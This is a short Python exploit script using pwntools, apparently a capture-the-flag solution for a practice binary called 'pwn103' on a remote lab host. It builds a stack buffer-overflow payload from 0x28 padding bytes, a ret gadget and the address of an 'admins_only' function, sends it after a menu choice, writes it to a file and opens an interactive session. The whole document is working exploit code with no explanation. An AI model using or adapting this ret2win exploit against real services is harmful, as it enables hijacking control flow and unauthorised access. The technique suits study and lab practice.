from pwn import *

context(arch="amd64", os="linux", endian="little")
elf = ELF("./pwn103")
rop = ROP(elf)
r = remote("10.10.64.66", 9003)

r.sendline(b"3")

payload =  b"A" * 0x28
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.symbols["admins_only"])

with open("x", "wb") as f:
    f.write(b"\x01\x0a" + payload)

r.sendline(payload)

r.interactive()
